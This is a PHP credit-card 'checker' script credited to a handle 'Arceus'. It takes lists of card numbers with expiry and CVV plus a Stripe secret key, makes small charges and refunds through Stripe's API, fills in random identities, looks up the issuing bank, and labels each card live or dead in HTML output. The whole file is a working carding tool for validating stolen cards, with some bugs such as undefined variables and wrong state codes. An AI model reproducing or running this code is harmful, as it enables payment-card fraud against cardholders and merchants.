<?php
# Credits to = Arceus (@rceus|@rceuss)
error_reporting(0);

# Functions
function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

# Variables
$lista = $_GET['lista'];
$sklive = $_GET['sk'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$binh = substr($cc, 0, 6);
$trest = substr($cc, 6, 16);
$mm = multiexplode(array(":", "|", ""), $lista)[1];
$yyyy = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", " "), $lista)[3];

# User Randomization
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
$infos = json_decode($get, 1);
$name_first = $infos['results'][0]['name']['first'];
$name_last = $infos['results'][0]['name']['last'];
$name_full = ''.$name_first.' '.$name_last.'';

$location_street = $infos['results'][0]['location']['street'];
$location_city = $infos['results'][0]['location']['city'];
$location_state = $infos['results'][0]['location']['state'];
$location_postcode = $infos['results'][0]['location']['postcode'];
if ($location_state == "alabama") {
    $location_state = "AL";
} else if ($location_state == "alaska") {
    $location_state = "AK";
} else if ($location_state == "arizona") {
    $location_state = "AR";
} else if ($location_state == "california") {
    $location_state = "CA";
} else if ($location_state == "colorado") {
    $location_state = "CO";
} else if ($location_state == "connecticut") {
    $location_state = "CT";
} else if ($location_state == "delaware") {
    $location_state = "DE";
} else if ($location_state == "district of columbia") {
    $location_state = "DC";
} else if ($location_state == "florida") {
    $location_state = "FL";
} else if ($location_state == "georgia") {
    $location_state = "GA";
} else if ($location_state == "hawaii") {
    $location_state = "HI";
} else if ($location_state == "idaho") {
    $location_state = "ID";
} else if ($location_state == "illinois") {
    $location_state = "IL";
} else if ($location_state == "indiana") {
    $location_state = "IN";
} else if ($location_state == "iowa") {
    $location_state = "IA";
} else if ($location_state == "kansas") {
    $location_state = "KS";
} else if ($location_state == "kentucky") {
    $location_state = "KY";
} else if ($location_state == "louisiana") {
    $location_state = "LA";
} else if ($location_state == "maine") {
    $location_state = "ME";
} else if ($location_state == "maryland") {
    $location_state = "MD";
} else if ($location_state == "massachusetts") {
    $location_state = "MA";
} else if ($location_state == "michigan") {
    $location_state = "MI";
} else if ($location_state == "minnesota") {
    $location_state = "MN";
} else if ($location_state == "mississippi") {
    $location_state = "MS";
} else if ($location_state == "missouri") {
    $location_state = "MO";
} else if ($location_state == "montana") {
    $location_state = "MT";
} else if ($location_state == "nebraska") {
    $location_state = "NE";
} else if ($location_state == "nevada") {
    $location_state = "NV";
} else if ($location_state == "new hampshire") {
    $location_state = "NH";
} else if ($location_state == "new jersey") {
    $location_state = "NJ";
} else if ($location_state == "new mexico") {
    $location_state = "NM";
} else if ($location_state == "new york") {
    $location_state = "LA";
} else if ($location_state == "north carolina") {
    $location_state = "NC";
} else if ($location_state == "north dakota") {
    $location_state = "ND";
} else if ($location_state == "ohio") {
    $location_state = "OH";
} else if ($location_state == "oklahoma") {
    $location_state = "OK";
} else if ($location_state == "oregon") {
    $location_state = "OR";
} else if ($location_state == "pennsylvania") {
    $location_state = "PA";
} else if ($location_state == "rhode Island") {
    $location_state = "RI";
} else if ($location_state == "south carolina") {
    $location_state = "SC";
} else if ($location_state == "south dakota") {
    $location_state = "SD";
} else if ($location_state == "tennessee") {
    $location_state = "TN";
} else if ($location_state == "texas") {
    $location_state = "TX";
} else if ($location_state == "utah") {
    $location_state = "UT";
} else if ($location_state == "vermont") {
    $location_state = "VT";
} else if ($location_state == "virginia") {
    $location_state = "VA";
} else if ($location_state == "washington") {
    $location_state = "WA";
} else if ($location_state == "west virginia") {
    $location_state = "WV";
} else if ($location_state == "wisconsin") {
    $location_state = "WI";
} else if ($location_state == "wyoming") {
    $location_state = "WY";
} else {
    $location_state = "KY";
}

# 1st Reqt
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sklive. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=Jeff Arkerman&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'');
$res1 = curl_exec($ch);
$s = json_decode($res1, true);
$token = $s['id'];

# 2nd Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'description=Jeff Arkerman&source='.$token.'');
curl_setopt($ch, CURLOPT_USERPWD, $sklive . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$res2 = curl_exec($ch);

# Charge Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Authorization: Bearer '.$sklive.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&customer='.$cus.'');
$res3 = curl_exec($ch);
curl_close($ch);
$chtoken = trim(strip_tags(getStr($res3,'"charge": "','"')));
$decline3 = trim(strip_tags(getStr($res3,'"decline_code": "','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Authorization: Bearer '.$sklive.'';
$headers[] = '';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$chtoken.'&amount=100&reason=requested_by_customer');
$curl = curl_exec($ch);
curl_close($ch);

# Bin Lookup
$bin = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bincheck.io/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: bincheck.io';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'origin: https://bincheck.io';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'referer: https://bincheck.io/';
$headers[] = 'accept-language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$curl = curl_exec($ch);
curl_close($ch);

$type = trim(strip_tags(getStr($curl, 'Card Type','Card')));
$level = trim(strip_tags(getStr($curl, 'Card Level','Issuer Name / Bank')));
$bank = trim(strip_tags(getStr($curl, 'Issuer Name / Bank','Issuer / Bank Website')));
$country = trim(strip_tags(getStr($curl, 'ISO Country Name','Country Flag')));

if (empty($type)) {
  $type = "N/A";
}
if (empty($bank)) {
  $bank = "N/A";
}
if (empty($country)) {
  $country = "N/A";
}

# Card Responses
if ((strpos($res2, 'incorrect_zip')) || (strpos($res2, 'Your card zip code is incorrect.')) || (strpos($res2, 'The zip code you supplied failed validation.'))){
echo '<span class="badge bg-success">#CVV</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">CVV Match</span> <span style="color: #FFA500">E-Code: Incorrect Zip</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif((strpos($res2, '"cvc_check": "pass"')) || (strpos($result3, '"seller_message": "Payment complete."' )) || (strpos($res2, '"cvc_check":"pass"'))){
echo '<span class="badge bg-success">#CVV</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">CVV Match</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif ((strpos($res2, 'Your card has insufficient funds.')) || (strpos($res1, 'insufficient_funds'))){
echo '<span class="badge bg-success">#CVV</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">CVV Match</span> <span style="color: #FFA500">E-Code: Insufficient Funds</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif ((strpos($res2, "Your card's security code is incorrect.")) || (strpos($res1, "incorrect_cvc")) || (strpos($res2, "The card's security code is incorrect."))){
echo '<span class="badge bg-warning text-dark">#CCN</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">CCN Match</span> <span style="color: #FFA500">E-Code: Incorrect CVC</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif(strpos($res1, 'invalid_cvc')){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Invalid CVC</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif ((strpos($res2, "Your card does not support this type of purchase.")) || (strpos($res1, "transaction_not_allowed"))){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Card does not support this type of purchase.</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif(strpos($res1, 'card_not_supported')){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Your card is not supported.</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif(strpos($res1, 'pickup_card')){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Pickup Card</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif(strpos($res1, 'lost_card')){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Lost Card</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif(strpos($res3, 'fraudulent')){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Fraudulent</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif(strpos($result1, 'processing_error')){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Processing Error</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif(strpos($res2, 'api_key_expired')){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: API Key Expired</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif(strpos($res1,'stolen_card')){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Stolen Card</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif((strpos($res1, '"cvc_check": "unavailable"')) || (strpos($res2, '"cvc_check": "unavailable"'))){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: CVC Check: Unavailable</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif((strpos($res1, '"cvc_check": "unchecked"')) || (strpos($res2, '"cvc_check": "unchecked"'))){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: CVC Check: Unchecked</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif((strpos($res1, '"cvc_check": "fail"')) || (strpos($res2, '"cvc_check": "fail"'))){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: CVC Check: Fail</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif ((strpos($res2, "do_not_honor"))||(strpos($res2, "do_not_honor"))){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Do Not Honour</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif((strpos($res1, 'rate_limit'))||(strpos($res2, 'rate_limit'))){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Request rate limit exceeded</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>'; 
}
elseif ((strpos($res1, "generic_decline")) || (strpos($res2, '"decline_code": "generic_decline"'))){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Generic Decline</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif ((strpos($res2, 'The card number is incorrect.')) || (strpos($res2, 'Your card number is incorrect.')) || (strpos($res2, 'incorrect_number'))){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Incorrect Card Number</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif ((strpos($res2, 'Your card has expired.')) || (strpos($res1, 'expired_card'))){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Expired  Card</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif ((strpos($res2, "Your card was declined.")) || (strpos($res2, 'The card was declined.')) || (strpos($res2, "card_declined"))){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Card Declined</span> <span style="color: #FFA500">E-Code: Your card was declined.</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}
elseif(strpos($res1, '"message": "The payment method `card` requires the parameter: card[number]."')){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Error!</span> <span style="color: #FFA500">E-Code: Cannot find payment method</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFCCCB">|</span> <span style="color: #FFFFFF">Arceus</span>&nbsp&nbsp';
}
elseif(strpos($res2, "You did not provide an API key. You need to provide your API key in the Authorization header, using Bearer auth (e.g. 'Authorization: Bearer YOUR_SECRET_KEY'). See https://stripe.com/docs/api#authentication for details, or we can help at https://support.stripe.com/.")){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Did Not Check</span> <span style="color: #FFA500">E-Code: Theres No Key Provided</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFCCCB">|</span> <span style="color: #FFFFFF">Arceus</span>&nbsp&nbsp';
}
elseif(strpos($res2, "Invalid API Key provided:")){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Error!</span> <span style="color: #FFA500">E-Code: Invalid API Key</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFCCCB">|</span> <span style="color: #FFFFFF">Arceus</span>&nbsp&nbsp';
}
elseif(strpos($res1, 'testmode_charges_only')){
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">Error!</span> <span style="color: #FFA500">E-Code: Testmode Charges Only</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFCCCB">|</span> <span style="color: #FFFFFF">Arceus</span>&nbsp&nbsp';
}
else{
echo '<span class="badge bg-danger">#DEAD</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFF00">'.$binh.'</span><span style="color: #FFFFFF">'.$trest.'|'.$mm.'|'.$yyyy.'|'.$cvv.'</span> <span style="color: #FFA500">'.$res2.'</span> <span style="color: #ADD8E6">'.$type.' -> '.$bank.' -> '.$country.'</span> <span style="color: #FFFFFF">|</span> <span style="color: #FFFFFF">Arceus</span>';
}

//**//
?>